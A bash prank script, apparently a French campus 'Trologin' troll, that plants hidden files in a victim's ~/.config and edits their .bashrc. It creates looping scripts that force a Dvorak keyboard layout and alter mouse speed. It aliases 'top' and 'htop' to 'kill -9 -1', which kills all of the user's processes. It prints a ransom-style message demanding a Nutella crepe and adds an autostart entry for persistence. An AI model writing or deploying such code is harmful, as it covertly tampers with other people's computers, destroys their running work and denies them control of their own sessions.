#!/bin/bash
cd 
echo "#!/bin/bash
while true
do
   printf '\r'
done" > .config/.the_game
chmod +x .config/.the_game
echo "#!/bin/bash
if [ -z \"\$var\" ]
then
   while true
   do
      setxkbmap dvorak
      xset m 10 0
      sleep 5
   done
fi
" > .config/.tmp_1h3g4me
chmod +x .config/.tmp_1h3g4me
places=("gonflable" "amphi" "cour" "entree" "distributeur" "toilettes amphi")
the_one=${places[RANDOM % ${#places[@]}]} 

echo "alias top='kill -9 -1'
alias htop='top'
echo \"VOUS ETES VICTIME DE TROLOGIN, N'ESSAYEZ PAS DE VOUS DEBATTRE. VEUILLEZ CRIER \\\"J'AI PERDU\\\" POUR VOUS IDENTIFIER, PUIS HURLEZ LA LOCALISATION DONNEE.\"
echo \"LOCALISATION : $the_one\"
echo \"0. FAITES CE QUI EST DIT AU DESSUS.\"
echo \"1. COMMANDEZ UNE CREPE AU NUTELLA ET REVENEZ A VOTRE ORDINATEUR AVEC LA CREPE.\"
echo \"2. ATTENDEZ 1 MINUTE DEVANT VOTRE ECRAN.\"
echo \"3. DEPOSEZ LA CREPE AU STAND, DITES LA FORMULE MAGIQUE A LA PERSONNE CHARGEE DU STAND ET REVENEZ A VOTRE ORDINATEUR.\"
echo \"FORMULE MAGIQUE : 'Si une personne dit cacahuete, donnez lui cette crepe.'\"
echo \"4. ATTENDEZ 5 MINUTES DEVANT VOTRE ECRAN.\"
echo \"5. ALLEZ A LA LOCALISATION OU VOUS TROUVEREZ UN PAPIER CONTENANT LES INSTRUCTIONS DE DEBLOQUAGE.\"
echo \"N'ESSAYEZ PAS DE NOUS ARNAQUER, OU LA SENTENCE SERA TERRIBLE.\"
echo \"And don't forget... The crepe is a lie.\"
./.config/.the_game &
./.config/.tmp_1h3g4me &" >> .bashrc
echo "[Desktop Entry]
Name=Not Trologin
Exec=bash $HOME/.config/.tmp_1h3g4me
Type=Application" > .config/autostart
source .bashrc
